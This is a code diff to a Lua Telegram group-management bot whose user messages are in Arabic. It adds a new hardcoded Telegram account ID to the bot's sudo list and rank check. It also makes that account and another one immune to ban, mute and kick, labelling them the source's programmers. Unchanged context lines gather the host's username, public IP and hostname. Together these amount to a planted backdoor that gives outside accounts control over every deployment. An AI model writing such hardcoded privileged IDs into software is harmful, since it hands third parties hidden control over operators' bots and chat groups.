@@ -11,7 +11,7 @@ https   = require("ssl.https")
 sudos   = dofile("sudo.lua")
 bot_id  = token:match("(%d+)")  
 Id_Sudo = Sudo
-List_Sudos = {Id_Sudo,1858175861,1198482178,1198482178}
+List_Sudos = {Id_Sudo,1858175861,1198482178,1329623702,}
 User = io.popen("whoami"):read('*a')
 IP = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*a')
 name = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a')
@@ -173,6 +173,8 @@ function Rank_Checking(user_id,chat_id)
 if tonumber(user_id) == tonumber(1858175861) then  
 var = true  
 elseif tonumber(user_id) == tonumber(1198482178) then
+var = true  
+elseif tonumber(user_id) == tonumber(1329623702) then
 var = true  
 elseif tonumber(user_id) == tonumber(Id_Sudo) then
 var = true  
@@ -4177,8 +4179,12 @@ if result.sender_user_id_ == tonumber(1858175861) then
 send(msg.chat_id_, msg.id_, "• لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} القيادة العظمى \n")
 return false 
 end
-if result.sender_user_id_ == tonumber(11984821781100) then
-send(msg.chat_id_, msg.id_, "• لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} القيادة العظمى \n")
+if result.sender_user_id_ == tonumber(1198482178) then
+send(msg.chat_id_, msg.id_, "• لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
+return false 
+end
+if result.sender_user_id_ == tonumber(1329623702) then
+send(msg.chat_id_, msg.id_, "• لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
 return false 
 end
 if Rank_Checking(result.sender_user_id_, msg.chat_id_) == true then
@@ -4479,6 +4485,14 @@ function Function_DevMaYor(extra, result, success)
 if result.id_ then
 if result.id_ == tonumber(1858175861) then
 send(msg.chat_id_, msg.id_, "• لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} القيادة العظمى \n")
+return false 
+end
+if result.id_ == tonumber(1198482178) then
+send(msg.chat_id_, msg.id_, "• لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
+return false 
+end
+if result.id_ == tonumber(1329623702) then
+send(msg.chat_id_, msg.id_, "• لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
 return false 
 end
 if Rank_Checking(result.id_, msg.chat_id_) == true then
